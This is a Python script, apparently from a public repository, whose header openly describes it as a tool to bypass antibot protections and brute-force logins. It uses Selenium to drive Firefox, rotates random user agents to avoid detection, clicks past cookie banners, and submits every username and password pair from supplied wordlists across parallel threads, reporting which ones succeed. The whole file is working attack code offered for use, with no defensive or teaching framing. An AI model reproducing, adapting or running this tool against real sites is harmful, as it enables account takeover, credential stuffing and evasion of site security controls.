#!/usr/bin/env python3
# Copyright (c) [2023] [Dividesbyzer0]
# This software is licensed under the MIT License. See the LICENSE file in the project root for details.
# This script mimics user interaction and bypasses antibot security measures to brute force logins   

import os
import argparse
import concurrent.futures
import random
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementClickInterceptedException


def read_user_agents(files):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
        "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 XL LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/15.15063"
    ]
    if files:
        filenames = files.split(',')
        user_agents.clear()
        for filename in filenames:
            with open(filename, 'r') as file:
                user_agents.extend([line.strip() for line in file])
    return user_agents

def click_login_button(driver):
    login_button = driver.find_element(By.ID, "login-submit")
    
    # Try to click the login button multiple times, handling the exception if another element obscures it
    for _ in range(5): # You can adjust the number of attempts as needed
        try:
            login_button.click()
            return True
        except ElementClickInterceptedException:
            # If the login button is obscured, click the consent button if present
            try:
                cookie_agreement_button = driver.find_element(By.ID, "truste-consent-button")
                cookie_agreement_button.click()
            except NoSuchElementException:
                pass
            sleep(1) # You can adjust the sleep duration as needed

    return False

def login_attempt(username, password, url, headless, user_agents):
    try:
        # Select a random user agent
        user_agent = random.choice(user_agents)

        # Set up options
        options = FirefoxOptions()
        options.set_preference("general.useragent.override", user_agent)
        if headless:
            options.add_argument("--headless")

        # Create a WebDriver instance
        driver = webdriver.Firefox(options=options)
        driver.get(url)

        # Click the cookie agreement button if present
        try:
            cookie_agreement_button = driver.find_element(By.ID, "truste-consent-button")
            cookie_agreement_button.click()
        except NoSuchElementException:
            pass

        # Find the email and password input elements and enter the credentials
        email_input = driver.find_element(By.NAME, "loginEmail")
        password_input = driver.find_element(By.NAME, "loginPassword")
        email_input.send_keys(username)
        password_input.send_keys(password)

        # Click the login button
        click_login_button(driver)
        
        # Wait for the page to update
        sleep(2)

        # Check for unsuccessful login
        try:
            driver.find_element(By.XPATH, "//div[contains(@class, 'alert-danger') and contains(text(), 'Invalid login or password.')]")
            print(f"Login failed for username: {username} and password: {password}")
        except NoSuchElementException:
            print(f"Login successful for username: {username} and password: {password}")
    except Exception as e:
        print(f"Login error for username: {username}. Error: {e}")
    finally:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description='Login brute-force script.')
    parser.add_argument('-U', '--usernames', required=True, help='Usernames file or single username')
    parser.add_argument('-p', '--passwords', required=True, help='Passwords file or single password')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Number of threads')
    parser.add_argument('-u', '--url', required=True, help='Login URL')
    parser.add_argument('--headless', action='store_true', help='Run headless')
    parser.add_argument('-a', '--useragents', help='User agents file(s), comma-separated')
    args = parser.parse_args()
    user_agents = read_user_agents(args.useragents)

    # Read usernames
    if os.path.isfile(args.usernames):
        with open(args.usernames, "r") as file:
            usernames = [line.strip() for line in file.readlines()]
    else:
        usernames = [args.usernames]

    # Read passwords
    if os.path.isfile(args.passwords):
        with open(args.passwords, "r") as file:
            passwords = [line.strip() for line in file.readlines()]
    else:
        passwords = [args.passwords]

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(login_attempt, username, password, args.url, args.headless, user_agents)
                   for username in usernames for password in passwords]
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    main()
